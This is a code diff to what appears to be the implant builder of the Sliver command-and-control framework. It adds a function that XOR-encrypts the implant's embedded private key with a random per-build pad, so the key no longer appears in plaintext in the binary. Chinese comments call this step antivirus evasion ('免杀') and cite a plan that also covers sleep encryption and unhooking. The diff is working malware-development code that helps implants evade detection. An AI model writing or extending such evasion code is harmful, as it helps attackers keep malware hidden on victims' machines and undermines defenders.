@@ -21,6 +21,7 @@ package generate
 import (
 	"archive/zip"
 	"bytes"
+	"crypto/rand"
 	"crypto/sha256"
 	"debug/elf"
 	"encoding/hex"
@@ -862,6 +863,9 @@ func renderSliverGoCode(name string, build *clientpb.ImplantBuild, config *clien
 			"GenerateUserAgent": func() string {
 				return pbC2Implant.UserAgent
 			},
+			// 免杀 R-1.2：敏感常量以「hex(密文):hex(pad)」注入，rodata 不含明文
+			// （cryptography 包须保持未渲染可编译，故为字符串字面量而非闭包表达式）
+			"ObfuscateHexPair": obfuscatedHexPair,
 		}).Parse(sliverGoCode)
 		if err != nil {
 			buildLog.Errorf("Template parsing error %s", err)
@@ -1497,4 +1501,22 @@ func goGarble(_ *clientpb.ImplantConfig) string {
 	// 	}
 	// }
 	return allGoPrivate
+}
+
+// obfuscatedHexPair —— 免杀 R-1.2（方案：docs/运行时免杀R组实施方案-SleepCrypt与Unhooking.md §二）：
+// 将注入模板的敏感常量（peer age 私钥）转为「hex(密文):hex(pad)」字符串字面量：
+// 每次构建生成随机 pad，明文逐字节异或后与 pad 分别 hex 编码；rodata 不含私钥明文，
+// 运行时由 cryptography.peerPrivateKey() 懒解码（驻留边界：rodata 层面消除，
+// 堆驻留由 R-1a sleepcrypt 与后续 R-1.3 管辖）。crypto/rand 失败时退化为
+// zero-pad（等价明文 hex，构建不中断，概率可忽略）。
+func obfuscatedHexPair(plain string) string {
+	pad := make([]byte, len(plain))
+	if _, err := rand.Read(pad); err != nil {
+		buildLog.Warnf("[render] random pad generation failed, R-1.2 degraded to zero pad")
+	}
+	enc := make([]byte, len(plain))
+	for i := 0; i < len(plain); i++ {
+		enc[i] = plain[i] ^ pad[i]
+	}
+	return hex.EncodeToString(enc) + ":" + hex.EncodeToString(pad)
 }
